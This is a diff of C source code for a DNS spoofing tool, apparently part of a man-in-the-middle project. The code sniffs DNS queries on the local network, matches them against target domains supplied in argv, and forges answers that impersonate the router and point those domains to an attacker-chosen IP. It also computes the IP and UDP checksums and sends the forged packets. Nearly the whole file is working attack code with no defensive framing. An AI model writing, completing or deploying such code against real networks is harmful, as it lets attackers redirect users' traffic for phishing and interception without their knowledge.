@@ -1,6 +1,51 @@
 #include "dns.h"
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include "../client.h"
 
-void ConstructDnsResponse(struct iovec *packet, char **argv)
+void AnalyzeDns(struct iovec *packet, char **argv)
+{
+    struct ether_header *ether;
+    struct iphdr        *ip;
+    struct udphdr       *udp;
+    struct dnshdr       *dns;
+    struct query        *query;
+
+    ether = (struct ether_header *)packet -> iov_base;
+    if ( ntohs(ether -> ether_type) != ETHERTYPE_IP
+            || memcmp(ether -> ether_shost, src_mac, 6) == 0 
+            || memcmp(ether -> ether_shost,
+                "\x00\x00\x00\x00\x00\x00", 6) == 0)
+        return;
+    ip = (struct iphdr *)((unsigned char
+                *)packet->iov_base+sizeof(*ether));
+    if ( ip -> protocol != IPPROTO_UDP )
+        return;
+    udp = (struct udphdr *)((unsigned char *)ip+sizeof(*ip));
+
+    if ( ntohs(udp -> dest) != 53 || ntohs(udp -> len) < 19 )
+        return;
+    dns = (struct dnshdr *)((unsigned char *)udp+sizeof(*udp));
+    if ( ntohs(dns -> q_count) != 1 || dns -> ans_count != 0 )
+        return;
+    query = (struct query *)((unsigned char *)dns+sizeof(*dns));
+    //define size
+    packet -> iov_len = sizeof(*ether) + sizeof(*ip) + sizeof(*udp)
+        + sizeof(*dns) + sizeof(struct question) + strlen((char *)&query ->
+                name)+1;
+    printf("domainn name request: %s\n", (unsigned char *)&query -> name);
+    printf("query size: %ld\n", sizeof(struct question)+strlen((char
+                *)&query -> name)+1);
+    ISlist_send(packet);
+}
+//use domains in argv like www.google.com example
+//argv[0] = "www.google.com"
+//argv[1] = "192.168.1.1"
+//argv[2] = NULL
+void DnsResponse(struct iovec *packet, char **argv)
 {
     struct ether_header   *ether;
     struct iphdr          *ip;
@@ -8,89 +53,84 @@ void ConstructDnsResponse(struct iovec *packet, char **argv)
     struct dnshdr         *dns;
     struct query          *query;
     struct res_record     *answer;
-    static int            client_index = 0;
-    static int            domain_index = 0;
-    unsigned int          len;
-    static unsigned short id = 1;
-    struct client         *tmp;
+    in_addr_t             in_tmp_ip;
+    register int          i;
 
-    
-    if (( tmp = GetClient(client_index)) == NULL )
-    {
-        packet -> iov_len = 0;
-        client_index = 0;
-        sleep(1);
-        return;
-    }
+    ISlist_recv(packet);
     if ( argv == NULL )
     {
-        fprintf(stderr, "Error calling construct dns response without
-                domains in arguments");
+        fprintf(stderr, "Error calling construct dns response without"
+                "domains in arguments\n"
+                "use domains in argv like google example\n"
+		            "argv[0] = \"google\"\n"
+	  	          "argv[1] = \"192.168.1.1\"\n"
+		            "argv[2] = NULL\n");
+        packet -> iov_len = 0;
         return;
     }
+    query = (struct query *)((unsigned char *)packet ->
+            iov_base+sizeof(*ether)+sizeof(*ip)+sizeof(*udp)+sizeof(*dns));
 
-    if ( argv[domain_index] == NULL )
+    //check if we are intrested to spoof this domain
+    for ( i = 0; argv[i] != NULL; i++ )
+    {
+       if (  strstr((char *)&query -> name, argv[i]) != NULL )
+       {
+           in_tmp_ip = inet_addr(argv[i+1]);
+           break;
+       }
+    }
+    if ( argv[i] == NULL )
     {
         packet -> iov_len = 0;
-        domain_index = 0;
-        sleep(1);
         return;
     }
     
     //ethernet
     ether = (struct ether_header *)packet->iov_base;
+    memcpy(ether -> ether_dhost, ether -> ether_shost, 6);
     memcpy(ether -> ether_shost, src_mac, 6);
-    memcpy(ether -> ether_dhost, tmp -> mac, 6);
-    ether -> ether_type = htons(ETHERTYPE_IP);
     //ip
-    ip = (struct iphdr *)(packet->iov_base+sizeof(*ether));
-    ip -> ihl = 20;
-    ip -> version = 4;
-    ip -> tos = 0;
+    ip = (struct iphdr *)((unsigned char *)packet->iov_base+sizeof(*ether));
     //ip -> tot_len = 0; //soon
-    ip -> id = 0;
-    ip -> frag_off = 0;
-    ip -> ttl = 64;
-    ip -> protocol = 11;//udp
-    memcpy(ip -> saddr, router_ip, 4);
-    memcpy(ip -> daddr, tmp -> ip, 4);
-    //ip -> check = crc(ip);
+    ip -> daddr = ip -> saddr;
+    memcpy((char *)&ip -> saddr, router_ip, 4);
+    ip -> check = 0;
     //udp
     udp = (struct udphdr
-            *)(packet->iov_base+sizeof(*ether)+sizeof(*ip));
-    udp -> source = htons(53); //udp port
-    udp -> dest = htons(28578); //depends on request
-    //udp -> len = 0; //soon
+            *)((unsigned char *)packet->iov_base+sizeof(*ether)+sizeof(*ip));
+    udp -> dest = udp -> source; //udp port
+    udp -> source = htons(53);
+    udp -> check = 0; //soon
     //dns 
-    dns = (struct dnshdr *)(udp+sizeof(*udp));
-    dns -> id = htons(0xab12);
-    dns -> rd = 1;
-    dns -> tc = 0;
-    dns -> aa = 0;
-    dns -> opcode = 0; 
-    dns -> qr = 0;
-    dns -> rcode = 0;
-    dns -> cd = 0;
-    dns -> ad = 0;
-    dns -> z = 0;
-    dns -> ra = 1;
-    dns -> q_count = htons(1);
+    dns = (struct dnshdr *)((unsigned char *)udp+sizeof(*udp));
     dns -> ans_count = htons(1);
-    dns -> auth_count = 0;
-    dns -> add_count = 0;
-    //query question
-    query = (struct query *)(dns+sizeof(*dns));
-    memcpy(query -> name, argv[i], (strlen(argv[domain_index]) <
-                256)?strlen(argv[domain_index]):256);
-    query -> quest.qtype = htons(1);//depends on req
-    query -> quest.qclass = (1); // depends on req
+    dns -> flags = htons(0x8400);//htons(0x8180);
     //res_record answer 
-    answer = (struct res_record *)(query+sizeof(*query));
-    memcpy(answer -> name, argv[domain_index],
-            (strlen(argv[domain_index])<256)?strlen(argv[domain_index]):256);
-    answer -> resources -> type = htons(1);//dpends on req
-    answer -> resources -> _class = htons(1);//depends on req
-    answer -> resources -> ttl = htonl(0x00015180);
-    answer -> resources -> data_len = htons(4);
-    memcpy(answer -> resources -> rdata, "1921", 4);
+    answer = (struct res_record *)((unsigned char
+                *)query+sizeof(struct question) + strlen((char
+                        *)&query ->name)+1);
+    //memcpy(answer -> name, argv[i],
+    //        (strlen(argv[i])<256)?strlen(argv[i]):256);
+    answer -> name = htons(0xc00c);
+    answer -> resources.type = htons(1); 
+    answer -> resources._class = htons(1);
+    answer -> resources.ttl = htonl(0x00000024);
+    answer -> resources.data_len = htons(4);
+    memcpy((char *)&answer -> rdata, (char *)&in_tmp_ip, 4);
+    udp -> len = htons(sizeof(*udp)+sizeof(*dns)+sizeof(struct
+                question)+strlen((char *)&query ->
+                    name)+1+sizeof(*answer));
+    ip -> tot_len = htons(sizeof(*ip)+ntohs(udp->len));
+    //udp -> check = crc32(0, udp, sizeof(*udp));
+    ip -> check = wrapsum(checksum((unsigned char *)ip, sizeof(*ip), 0));
+    udp -> check = wrapsum(checksum((unsigned char *)udp,
+                sizeof(*udp), checksum(dns, sizeof(*dns)+sizeof(struct
+                        question)+strlen((char *)&query ->
+                            name)+sizeof(struct rdata)+4),
+                checksum((unsigned char *)&ip->saddr, 2 *
+                    sizeof(ip->saddr), IPPROTO_UDP +(unsigned
+                        int)ntohs(udp->len))));
+    packet -> iov_len = (ntohs(ip -> tot_len)+sizeof(*ether));
+}
 
